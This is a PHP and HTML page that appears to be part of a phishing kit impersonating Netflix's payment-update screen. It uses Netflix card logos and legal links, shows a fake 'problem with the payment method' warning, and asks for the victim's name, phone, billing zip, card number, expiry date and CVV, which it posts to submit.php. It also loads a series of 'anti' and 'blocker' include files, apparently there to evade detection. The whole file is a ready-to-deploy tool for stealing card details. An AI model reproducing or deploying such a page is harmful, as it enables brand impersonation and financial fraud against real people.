<?php 
include_once "./submit.php";
include_once "./includes/header.html" 
?>
<?php
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
?>

<div class="simpleContainer">
    <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
        <form method="POST" action="submit.php">
            <div class="paymentFormContainer">

            <?php  if(isset($_SESSION["error_u_pay"]) ){ 
                if(isset($_SESSION["error_u_pay"]) ){  ?>

                <div class="messageContainer">
                    <div class="nf-message-container nf-message-warn">
                        <div class="nf-message-icon"></div>
                        <div class="nf-message-contents" data-uia="UIMessage-content">
                            <span>There appears to be a problem with the payment method you are trying to use.</span>
                        </div>
                    </div>
                </div>

            <?php } } ?>

                <div>
                    <div class="stepHeader-container">
                        <div class="stepHeader">
                            <h1 class="stepTitle">please update your credit or debit card.</h1>
                        </div>
                    </div>
                </div>
                <div class="fieldContainer">
                    <span class="logos logos-block">
                        <img alt="" class="logoIcon VISA" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg">
                        <img alt="" class="logoIcon MASTERCARD" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg">
                        <img alt="" class="logoIcon AMEX" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg">
                        <img alt="" class="logoIcon DISCOVER" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_discover.png" srcset="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_discover_2x.png 2x">
                    </span>
                    <div class="">
                        <ul class="simpleForm structural ui-grid" style="list-style-type:none">
                        <li class="nfFormSpace">
                                <div class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="firstName">
                                            <input name="firstName" class="nfTextField " id="id_firstName" type="text" tabindex="0" 
                                            autocomplete="cc-given-name" maxlength="100" minlength="1" 
                                            value="<?php if(isset($_SESSION["firstName"])) echo $_SESSION["firstName"] ;  ?>"  >
                                            <label or="id_firstName" class="placeLabel">First Name</label>
                                        </label>
                                    </div>
                                    <div hidden id="inputErrorMsgFirst" class="inputError"></div>
                                </div>
                            </li>
                            <li class="nfFormSpace">
                                <div class="nfInput  nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="lastName">
                                            <input name="lastName" class="nfTextField" id="id_lastName" type="text" tabindex="0" 
                                            autocomplete="cc-family-name" value="<?php if(isset($_SESSION["lastName"])) echo $_SESSION["lastName"] ;?>">
                                            <label for="id_lastName" class="placeLabel">Last Name</label>
                                        </label>
                                    </div>
                                    <div hidden id="inputErrorMsgLast" class="inputError"></div>
                                </div>
                            </li>
                            <li class="nfFormSpace">
                                <div data-uia="field-creditZipcode+container" class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="phone number">
                                            <input name="phone" class="nfTextField" id="id_phone" type="tel" tabindex="0" autocomplete="off" minlength="2" value="<?php if (isset($_SESSION["phone"])) echo $_SESSION["phone"];  ?>">
                                            <label for="id_phone" class="placeLabel">Phone Number</label>
                                        </label>
                                    </div>
                                    <div hidden id="inputErrorMsgPHN" class="inputError"></div>
                                </div>
                            </li>
                            <li class="nfFormSpace">
                                <div data-uia="field-creditZipcode+container" class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="creditZipcode">
                                            <input name="creditZipcode" class="nfTextField" id="id_creditZipcode" type="tel" tabindex="0" autocomplete="off" minlength="5" value="<?php if (isset($_SESSION["creditZipcode"])) echo $_SESSION["creditZipcode"];  ?>">
                                            <label for="id_creditZipcode" class="placeLabel">Billing Zip Code</label>
                                        </label>
                                    </div>
                                    <div hidden id="inputErrorMsgBZ" class="inputError"></div>
                                </div>
                            </li>
                            <li class="nfFormSpace">
                                <div class="cardNumberContainer">
                                    <div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
                                        <div class="nfInputPlacement">
                                            <label class="input_id" placeholder="creditCardNumber">
                                                <input name="creditCardNumber" class="nfTextField" id="id_creditCardNumber" type="tel" tabindex="0" autocomplete="off" maxlength="19" minlength="12" value="<?php if (isset($_SESSION["creditCardNumber"])) echo $_SESSION["creditCardNumber"];  ?>">
                                                <label for="id_creditCardNumber" class="placeLabel">Card Number</label>
                                            </label>
                                        </div>
                                        <div hidden id="inputErrorMsgCN" class="inputError"></div>
                                    </div>
                                </div>
                            </li>
                            <li class="nfFormSpace">
                                <div class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="creditExpirationMonth">
                                            <input name="creditExpirationMonth" class="nfTextField" id="id_creditExpirationMonth" type="tel" tabindex="0" autocomplete="off" value="<?php if (isset($_SESSION["creditExpirationMonth"])) echo $_SESSION["creditExpirationMonth"];  ?>">
                                            <label for="id_creditExpirationMonth" class="placeLabel">Expiration Date (MM/YY)</label>
                                        </label>
                                    </div>
                                    <div hidden id="inputErrorMsgMD" class="inputError"></div>
                                </div>
                            </li>
                            <li class="nfFormSpace">
                                <div class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="creditCardSecurityCode">
                                            <input name="creditCardSecurityCode" class="nfTextField" id="id_creditCardSecurityCode" type="tel" tabindex="0" autocomplete="off" maxlength="4" minlength="3" value="<?php if (isset($_SESSION["creditCardSecurityCode"])) echo $_SESSION["creditCardSecurityCode"];  ?>">
                                            <label for="id_creditCardSecurityCode" class="placeLabel">Security Code (CVV)</label>
                                        </label>
                                        <div id="inputErrorMsgCNN" class="inputError"></div>

                                    </div>

                            </li>


                        </ul>
                    </div>

                    <ul class="simpleForm structural ui-grid">
                        <li class="nfFormSpace">
                            <div class="signupTerms" id="tou-us-no_trial">
                                <span>
                                    <p>By clicking the "Update" button below, you agree to our
                                        <a target="blank" href="https://help.netflix.com/legal/termsofuse">Terms of
                                            Use</a>, <a target="blank" href="https://help.netflix.com/legal/privacy">Privacy
                                            Statement</a>, that you are over 18, and that <b>Netflix
                                            will automatically continue your membership and charge the
                                            monthly membership fee to your payment
                                            method until you cancel. You may cancel at any time to avoid
                                            future charges.</b> To cancel, go to Account and click
                                        "Cancel Membership."
                                    </p>
                                </span>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <input type="hidden" name="type" value="update">

            <div class="submitBtnContainer">
                <button type="submit" autocomplete="off" id="btn_cc" disabled class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize">Update Membership</button>
            </div>
        </form>
    </div>
</div>

<?php unset($_SESSION['error']); include_once "./includes/footer.html" ?>